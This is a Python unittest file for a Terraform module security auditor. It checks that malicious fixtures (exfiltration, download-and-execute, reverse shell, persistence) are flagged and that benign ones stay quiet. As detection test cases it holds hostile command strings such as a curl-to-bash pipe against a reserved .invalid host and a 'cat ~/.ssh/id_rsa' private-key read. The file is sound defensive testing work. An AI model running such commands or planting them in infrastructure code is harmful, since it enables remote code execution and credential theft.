"""Canary + control tests:  python3 -m unittest

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular registry modules really use) must stay below its ceiling. Fixtures
are inert: hosts are reserved (.invalid, TEST-NET 203.0.113.0/24), tokens are CANARY strings,
and nothing here is ever initialised, planned or applied.
"""
import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import terraform_audit as ta  # noqa: E402

FIX = os.path.join(HERE, "fixtures")
EXPECT = {
    "mal-plan-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-plan-script-cred": ("CRITICAL", "credential_exfil"),
    "mal-plan-python-env": ("CRITICAL", "env_exfil"),
    "mal-localexec-curl-sh": ("CRITICAL", "download_execute"),
    "mal-http-state-exfil": ("CRITICAL", "http_secret_exfil"),
    "mal-http-cred-exfil": ("CRITICAL", "http_secret_exfil"),
    "mal-http-external-chain": ("CRITICAL", "http_secret_exfil"),
    "mal-b64-hidden-command": ("CRITICAL", "download_execute"),
    "mal-b64-pipe-sh": ("HIGH", "encoded_exec"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-token-exfil": ("CRITICAL", "secret_env_exfil"),
    "mal-persist": ("HIGH", "persistence_write"),
    "mal-tf-json": ("CRITICAL", "env_exfil"),
}
# benign: the maximum level each may reach (remote-exec / user_data curl|sh is capped at LOW)
CEILING = {"ok-remote-exec-docker": "LOW"}


def scan_fixture(name, include_all=False):
    return ta.scan_module(ta.files_from_dir(os.path.join(FIX, name)), name, include_all)


class Canaries(unittest.TestCase):
    def test_malicious_fire(self):
        for name, (want, fid) in EXPECT.items():
            with self.subTest(name):
                r = scan_fixture(name)
                ids = {f["id"] for f in r["findings"]}
                self.assertGreaterEqual(ta.SEV_ORDER[r["risk_level"]], ta.SEV_ORDER[want], (name, r["summary"]))
                self.assertIn(fid, ids, (name, sorted(ids)))

    def test_all_fixtures_covered(self):
        names = set(os.listdir(FIX))
        self.assertEqual({n for n in names if n.startswith("mal-")}, set(EXPECT))

    def test_benign_quiet(self):
        for name in sorted(os.listdir(FIX)):
            if not name.startswith("ok-"):
                continue
            with self.subTest(name):
                r = scan_fixture(name)
                ceil = CEILING.get(name, "SAFE")
                self.assertLessEqual(ta.SEV_ORDER[r["risk_level"]], ta.SEV_ORDER[ceil],
                                     (name, [(f["severity"], f["id"], f["file"]) for f in r["findings"]]))

    def test_examples_skipped_unless_all(self):
        self.assertEqual(scan_fixture("ok-examples-only")["risk_level"], "SAFE")
        self.assertEqual(scan_fixture("ok-examples-only", include_all=True)["risk_level"], "CRITICAL")

    def test_plan_escalation(self):
        r = scan_fixture("mal-plan-script-cred")
        self.assertIn("scripts/account.sh (plan)", r["execution"]["scripts_invoked"])

    def test_remote_capped(self):
        r = scan_fixture("ok-remote-exec-docker")
        self.assertTrue(all(f["severity"] == "LOW" for f in r["findings"]))


class Units(unittest.TestCase):
    def test_text_pipe_to_shell(self):
        self.assertEqual(ta.scan("curl https://x.invalid/a | bash")["risk_level"], "CRITICAL")

    def test_text_benign(self):
        self.assertEqual(ta.scan('resource "aws_s3_bucket" "b" { bucket = "x" }')["risk_level"], "SAFE")

    def test_comment_and_description_ignored(self):
        t = ('# provisioner "local-exec" { command = "curl https://x.invalid | sh" }\n'
             'variable "v" { description = "run curl https://x.invalid | sh yourself" }\n')
        self.assertEqual(ta.scan(t)["risk_level"], "SAFE")

    def test_lexer_heredoc_and_interpolation(self):
        t = ('resource "null_resource" "a" {\n  provisioner "local-exec" {\n    command = <<EOT\n'
             'echo "${jsonencode({ a = "}" })}" }}}\nEOT\n  }\n}\n'
             'data "external" "x" { program = ["sh", "-c", "echo ${"{"}"] }\n')
        f = ta.TFFile("a.tf", t)
        kinds = [(b["type"], tuple(b["labels"])) for b in f.blocks]
        self.assertIn(("provisioner", ("local-exec",)), kinds)
        self.assertIn(("data", ("external", "x")), kinds)

    def test_public_key_is_not_a_credential(self):
        self.assertFalse(ta.CRED_RE.search('file("~/.ssh/id_rsa.pub")'))
        self.assertTrue(ta.CRED_RE.search('cat ~/.ssh/id_rsa'))

    def test_test_files_skipped(self):
        self.assertTrue(ta.SKIP_DIR_RE.search("/lambdas/notifier/tests.py"))
        self.assertFalse(ta.SKIP_DIR_RE.search("/scripts/latest.py"))

    def test_module_source_risk(self):
        self.assertEqual(ta._module_source_risk("git::https://github.com/a/b.git", None)[0], "LOW")
        self.assertEqual(ta._module_source_risk("git::https://github.com/a/b.git?ref=main", None)[0], "LOW")
        self.assertEqual(ta._module_source_risk("git::https://github.com/a/b.git?ref=v1.2.0", None)[0], "INFO")
        self.assertEqual(ta._module_source_risk("terraform-aws-modules/vpc/aws", "6.0")[0], "INFO")
        self.assertEqual(ta._module_source_risk("https://example.invalid/m.zip", None)[0], "LOW")

    def test_parse_source(self):
        k, u, s = ta.parse_source("git::https://github.com/o/r?ref=abc")
        self.assertEqual((k, u, s), ("github", "https://codeload.github.com/o/r/tar.gz/abc", ""))
        k, u, s = ta.parse_source("github.com/o/r//modules/x?ref=v1")
        self.assertEqual(s, "modules/x")

    def test_registry_spec(self):
        self.assertTrue(ta._is_registry_spec("terraform-aws-modules/vpc/aws"))
        self.assertTrue(ta._is_registry_spec("terraform-aws-modules/vpc/aws@6.0.0"))
        self.assertFalse(ta._is_registry_spec("github.com/o/r"))

    def test_exit_code(self):
        p = os.path.join(FIX, "mal-revshell")
        import io, contextlib
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(ta.main([p]), 2)
            self.assertEqual(ta.main([os.path.join(FIX, "ok-http-checkip")]), 0)


if __name__ == "__main__":
    unittest.main()
